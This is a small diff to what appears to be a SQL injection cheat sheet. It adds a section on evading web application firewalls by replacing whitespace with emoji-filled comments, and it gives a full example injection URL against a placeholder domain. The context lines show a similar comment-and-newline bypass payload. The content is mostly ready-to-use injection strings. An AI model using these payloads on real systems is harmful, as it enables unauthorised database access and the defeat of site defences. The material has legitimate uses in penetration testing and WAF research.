@@ -40,6 +40,15 @@ or with
 ```http://domain.com/index.php?id=1'%23nuLL%0Aorder%23nuLL%0Aby%23nuLL%0A1--%23nuLL%0A-```  
 and so on...
 
+## Whitespace Bypass via Emoji
+
+```
+/*️*/
+/*️⃣*/
+```
+
+For example:  
+```http://domain.com/index.php?id=1'/*️*/order/*️*/by/*️*/1--/*️*/-```
 
 ## WAF blocks retrieving information from database()
 
